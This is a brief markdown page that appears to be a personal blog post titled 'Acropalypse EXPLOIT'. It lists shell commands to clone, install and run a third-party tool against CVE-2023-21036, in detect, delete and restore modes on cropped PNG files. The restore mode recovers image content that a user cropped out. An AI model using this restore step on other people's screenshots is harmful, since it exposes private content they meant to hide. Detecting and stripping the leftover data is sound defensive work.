---
title: Acropalypse EXPLOIT
published: true
---

# How to exploit Acropalypse - CVE-2023-21036
[Tool used for exploit](https://github.com/Absenti/acropalypse_png).

``` 
git clone https://github.com/Absenti/acropalypse_png
cd acropalypse_png
pip install pillow numpy
python acropalypse_png.py detect <cropped_png>
python acropalypse_png.py delete <cropped_png> <output_png>
python acropalypse_png.py restore <type_exploit> <cropped_png> <reconstructed_png>
```
